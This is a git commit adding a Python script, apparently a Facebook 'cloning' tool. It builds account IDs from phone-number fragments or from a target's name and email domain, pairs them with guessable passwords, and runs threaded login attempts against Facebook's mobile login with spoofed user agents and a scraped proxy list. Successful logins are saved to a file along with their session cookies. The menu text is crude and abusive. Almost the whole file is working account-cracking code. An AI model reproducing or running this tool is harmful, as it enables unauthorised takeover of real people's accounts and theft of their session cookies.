547e345fc8ca8182c9ff868b50e0c2d58f5d6582
polash-003 <150609385+polash-003@users.noreply.github.com>
2023-11-13 01:35:02 +0600

    Add files via upload

---
+++ BODNA.py
@@ -0,0 +1,252 @@
+#---------------------[ INFO ]---------------------#
+#JOIN : https://www.facebook.com/profile.php?id=100093064795809
+#JOIN : https://www.facebook.com/profile.php?id=10009306479580907
+#---------------------[MODULES ]---------------------#
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+
+logo = ("""
+      ____   ___  ____  _   _    _       ______   ______  _____ ____  
+
+\033[38;5;46m█░█ █▀█ █▄▀ █▀▀ █▀█
+\033[38;5;46m█▀█ █▄█ █░█ ██▄ █▀▄
+                                                                                             
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|          
+    NASA HOKER CEO POLATOK 
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+""")
+ 
+class Main:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+        print(" [01] TOR BICI CLONING")
+        print(" [02] TOR PASA CLONING")
+        print(" [03] TOR BICI & PASA CLONING")
+        print(" [04] FUCK YOU BICI CLONING")
+        print(" [05] FUCK YOUR PASA CLONING")
+        print(" [00] TOR PASAR SIZE 46 EXIT KORO")
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        Mumit =input(" [?] Choose : ")
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100093064795809')
+        if Mumit in ["1", "01"]:
+            num()
+        if Mumit in ["3","03"]:
+            num()
+        if Munint in ["4","04"]:
+        	num()
+        if Munint in ["5","05"]:
+        	num()
+        if Mumit in ["2","02"]:
+            gml()
+        if Mumit in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+def num():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE SIZE : 32, 36, 42, 44, 46, 48 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    kode = input(' [?] Enter size code: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print(' [+] TOR PASAR SIZE KOTO : 36, 42, 44, 46,  ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input(' [?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] TOR PASAR SIZE ONEK BASE TAI HACK HoIo nah')
+        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] nasa hokar CEO POLATOK ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
+
+def gml():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [?] Target fast name : ')
+    os.system('clear')
+    print(logo)
+    kodex = input(' [?] Target last name :  ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : @gmail.fuck, @yahoo.fuck, @nasa.fuck ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    doamin = input(' [?] Terget doamin : ')
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE SIZE : 32, 36, 42, 44, 46, 48 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input('[?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] Process has been started')
+        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] Use flight mode for speed up ')
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
+def rcrack1(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[\033[1;92mPASA HACKER SAAD VAI\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'x.facebook.com',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-US,en;q=0.9',
+           'cache-control': 'max-age=0',
+           'sec-ch-prefers-color-scheme': 'light',
+           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-model': '"Infinix PR652B"',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-ch-ua-platform-version': '"11.0.0"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[38;5;46m[PASA HACKER SAAD-OK] {uid} | {ps}")
+                print(f" Cookie : {coki}")
+                print("\x1b[38;5;208m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            #elif 'checkpoint' in log_cookies:
+                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                #cid = coki[82:97]
+                #print(f"\x1b[38;5;196m[𝐀.𝐀𝐚𝐥𝐚𝐱 𝐉𝐚𝐡𝐢𝐝-CP] {cid} | {ps}")
+                #open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+                #cps.append(uid)
+                #break
+            else:
+                continue
+        loop+=1
+        #sys.stdout.write(f'\r\033[m[𝐀.𝐀𝐚𝐥𝐚𝐱 𝐉𝐚𝐡𝐢𝐝] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        #sys.stdout.flush()
+    except:
+        pass
+Main()
